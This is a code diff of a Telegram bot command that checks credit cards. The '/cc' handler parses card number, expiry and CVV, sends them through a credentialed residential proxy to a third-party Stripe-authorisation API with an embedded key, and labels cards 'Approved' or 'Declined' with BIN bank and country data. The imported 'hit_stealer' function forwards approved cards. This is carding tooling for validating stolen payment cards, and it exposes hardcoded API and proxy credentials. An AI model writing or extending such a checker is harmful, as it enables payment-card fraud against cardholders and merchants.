@@ -1,38 +1,16 @@
 from pyrogram import Client, filters
 from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 from pyrogram.enums import ChatType
-import re, time, httpx
+import re, time, httpx, requests
+from httpx_socks import AsyncProxyTransport
 from plugins.func.users_sql import *
 from plugins.tools.hit_stealer import send_hit_if_approved
 from datetime import date
 
-API_URL = "https://barryxapi.xyz/stripe_auth"
+API_URL = "https://barryxapi.xyz/str_auth"
 API_KEY = "BRY-HEIQ7-KPWYR-DRU67"
 
-async def get_bin_info(bin_number: str) -> dict:
-    try:
-        async with httpx.AsyncClient(timeout=10) as client:
-            res = await client.get(f"https://api.voidex.dev/api/bin?bin={bin_number}")
-            if res.status_code == 200:
-                d = res.json()
-                return {
-                    "bank": d.get("bank", "UNKNOWN"),
-                    "scheme": d.get("brand", "UNKNOWN").upper(),
-                    "type": d.get("type", "UNKNOWN").upper(),
-                    "brand": d.get("level", "UNKNOWN").upper(),
-                    "country": d.get("country_name", "UNKNOWN"),
-                    "flag": d.get("country_flag", "🏳️")
-                }
-    except:
-        pass
-    return {
-        "bank": "UNKNOWN",
-        "scheme": "UNKNOWN",
-        "type": "UNKNOWN",
-        "brand": "UNKNOWN",
-        "country": "UNKNOWN",
-        "flag": "🏳️"
-    }
+session = requests.Session()
 
 @Client.on_message(filters.command("cc", prefixes=["/", "."]))
 async def cmd_cc(Client, message):
@@ -54,9 +32,7 @@ async def cmd_cc(Client, message):
 
         if chat_type == ChatType.PRIVATE and role == "FREE":
             return await message.reply_text(
-                "⚠️ <b>Premium Users Required</b>\n"
-                "Only Premium users can use this command in bot PM.\n"
-                "Join our group to use it for FREE:",
+                "⚠️ <b>Premium Users Required</b>\nOnly Premium users can use this in bot PM.\nJoin group for free use:",
                 reply_markup=InlineKeyboardMarkup([
                     [InlineKeyboardButton("Join Group", url="https://t.me/+Rl9oTRlGfbIwZDhk")]
                 ]),
@@ -69,18 +45,14 @@ async def cmd_cc(Client, message):
 
         if credit < 1:
             return await message.reply_text("❌ Insufficient credit.")
-
         if now - antispam_time < wait_time:
             return await message.reply_text(f"⏳ Wait {wait_time - (now - antispam_time)}s (AntiSpam)")
 
-        cc_text = None
-        if message.reply_to_message:
-            cc_text = message.reply_to_message.text or message.reply_to_message.caption
-        elif len(message.text.split(maxsplit=1)) > 1:
-            cc_text = message.text.split(maxsplit=1)[1]
-
+        cc_text = message.reply_to_message.text if message.reply_to_message else (
+            message.text.split(maxsplit=1)[1] if len(message.text.split()) > 1 else None
+        )
         if not cc_text:
-            return await message.reply_text("❌ Usage: /cc <cc|mm|yy|cvv> or reply to CC.")
+            return await message.reply_text("❌ Usage: /cc <cc|mm|yy|cvv>")
 
         match = re.search(r"(\d{12,16})[^\d]?(\d{1,2})[^\d]?(\d{2,4})[^\d]?(\d{3,4})", cc_text)
         if not match:
@@ -100,25 +72,42 @@ async def cmd_cc(Client, message):
 
         tic = time.perf_counter()
         try:
-            async with httpx.AsyncClient(timeout=25) as client:
+            proxy_url = "http://package-1111111-country-us:5671nuWwEPrHCw2t@proxy.rampageproxies.com:5000"
+            transport = AsyncProxyTransport.from_url(proxy_url)
+            async with httpx.AsyncClient(transport=transport, timeout=25) as client:
                 res = await client.get(f"{API_URL}?key={API_KEY}&card={fullcc}")
-                data = res.json()
-                card_status = data.get("status", "").lower()
-                card_message = data.get("message") or data.get("error") or "No message"
-        except:
+                if res.status_code == 200:
+                    data = res.json()
+                    card_status = data.get("status", "").lower()
+                    card_message = data.get("message") or data.get("error") or res.text or "❌ Unknown response"
+                else:
+                    card_status = "error"
+                    card_message = f"❌ HTTP {res.status_code}"
+        except Exception as e:
             card_status = "error"
-            card_message = "❌ Request failed or server did not return JSON."
+            card_message = f"❌ Request failed: {e}"
 
         toc = time.perf_counter()
 
-        bin_data = await get_bin_info(ccnum[:6])
-        bank = bin_data["bank"]
-        bin_type = f"{bin_data['scheme']} - {bin_data['type']} - {bin_data['brand']}"
-        country = bin_data["country"]
-        flag = bin_data["flag"]
+        try:
+            headers = {"User-Agent": "Mozilla/5.0"}
+            proxies = {
+                "http": proxy_url,
+                "https": proxy_url
+            }
+            binres = session.get(f"https://api.voidex.dev/api/bin?bin={ccnum[:6]}", headers=headers, proxies=proxies, timeout=15).json()
+            brand = str(binres.get("brand") or binres.get("scheme") or "N/A").upper()
+            type_ = str(binres.get("type", "N/A")).upper()
+            level = str(binres.get("level", "N/A")).upper()
+            bank = str(binres.get("bank", "N/A")).upper()
+            country = str(binres.get("country_name", "N/A")).upper()
+            flag = binres.get("country_flag") or "🏳️"
+        except Exception as e:
+            brand = type_ = level = bank = country = "N/A"
+            flag = "🏳️"
 
         msg_lower = card_message.lower()
-        if any(k in msg_lower for k in ["approved", "success", "charged", "card added", "insufficient_funds", "incorrect_cvc"]):
+        if any(k in msg_lower for k in ["approved", "success", "charged",  "insufficient_funds", "incorrect_cvc"]):
             status = "Approved ✅"
         elif any(k in msg_lower for k in ["declined", "pickup", "fraud", "stolen", "lost", "do not honor"]):
             status = "Declined ❌"
@@ -133,7 +122,7 @@ async def cmd_cc(Client, message):
 <b>⊙ Status:</b> {status}
 <b>⊙ Response:</b> {card_message}
 <b>⊙ Bank:</b> {bank}
-<b>⊚ Bin type:</b> {bin_type}
+<b>⊚ Bin type:</b> {brand} - {type_} - {level}
 <b>⊙ Country:</b> {country} {flag}
 <b>⊙ Time:</b> {toc - tic:.2f}s
 <b>❛ ━━━━・⌁ 𝑩𝑨𝑹𝑹𝒀 ⌁・━━━━ ❜</b>
